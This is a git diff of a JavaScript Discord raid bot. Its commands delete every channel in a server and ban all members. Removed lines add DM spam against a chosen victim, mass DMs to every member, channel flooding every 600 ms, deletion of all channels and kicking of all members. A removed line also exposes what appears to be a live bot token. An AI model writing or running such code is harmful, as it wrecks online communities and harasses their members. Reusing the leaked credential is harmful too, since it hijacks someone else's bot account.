@@ -7,7 +7,7 @@ console.log(`Logged in as ${client.user.tag}!`);
 });
 
 client.on('message', message =>{
-    if (message.content.startsWith('>hack')){
+    if (message.content.startsWith('$hack')){
             if (message.channel.guild){
                 message.guild.channels.forEach(c =>{
                     if(c.deletable){
@@ -96,103 +96,17 @@ client.on('message', message =>{
             }
         }
 });
-/////
-client.on('message', message => {
-    if (isOwner(message.author.id)) {
-        var args = message.content.split(" ");
- 
-        // Spam someone in DM
-        if (args[0] == prefix + 'dm') {
-            if (args[1] != null && args[2] != null) {
-                delete args[0];
-                var victimid = client.users.get(args[1]);
-                delete args[1];
-                var msg = args.join(" ");
-                client.fetchUser(victimid).then((victim) => {
-                    var interval = setInterval(function () {
-                        victim.send(msg);
-                    }, 600);
-                });        
-            }
-        }
- 
-        // DM all members in a server
-        if (args[0] == prefix + 'dms') {
-            if (args[1] != null && args[2] != null) {
-                delete args[0];
-                var serverid = args[1];
-                delete args[1];
-                var msg = args.join(" ");
-                client.guilds.get(serverid).members.map(m => {
-                    m.send(msg);
-                });
-            }
-        }
- 
-        // Spam multiple channels in a server
-        if (args[0] == prefix + 'raid') {
-            if (args[1] != null && args[2] != null) {
-                delete args[0];
-                var gid = args[1];
-                delete args[1];
-                var msg = args.join(" ");
-                var interval = setInterval(function () {
-                        client.guilds.get(gid).channels.map(c => {
-                            if (c.type == "text") c.send(msg);
-                        });
-                }, 600);
-            }
-        }
- 
-        // Deletes all channels of a server
-        if (args[0] == prefix + 'nuke') {
-            if (args[1] != null) {
-                let guild = client.guilds.get(args[1]);
-                guild.channels.forEach(c => {
-                    c.delete();
-                });
-            }
-        }
- 
-        // Kicks all members from server
-        if (args[0] == prefix + 'prune') {
-            if (args[1] != null) {
-                let guild = client.guilds.get(args[1]);
-                guild.members.forEach(m => {
-                    m.kick();
-                });
-            }
-        }
- 
-        // Restart bot
-        if (args[0] == prefix + 'restart') {
-               require("child_process").spawn(process.argv.shift(), process.argv, {
-                   cwd: process.cwd(),
-                   detached : true,
-                   stdio: "inherit"
-               });
-               process.exit();
-        }
-    }
+/////Ban all
+client.on('message', msg => {
+         if (msg.content === prefix + "ban all") {
+     if(!msg.channel.guild) return;
+     
+      msg.guild.members.forEach( member => {
+          
+          member.ban()
+      })
+}
 });
- 
-/*
-Join handler
-*/
-client.on('guildMemberAdd', (member, channel, guild) => {
-    try {
-        if (dm != false && serverid != null && serverid != "" && msg != "") {
-            if (typeof (member) != "undefined") {
-                var gid = member.guild.id;
-                if (gid == serverid) {
-                    member.send(msg);
-                }
-            }
-        }
-    } catch (err) {
-        console.log("[Join] " + err);
-    }
-});
-/////
-client.login('Nzk0OTI2NzQwMTczNjE5MjMy.X_B7Nw.bF0cfJqL35OvJyrIuy7EiJY09FI
+////
+client.login("")
           
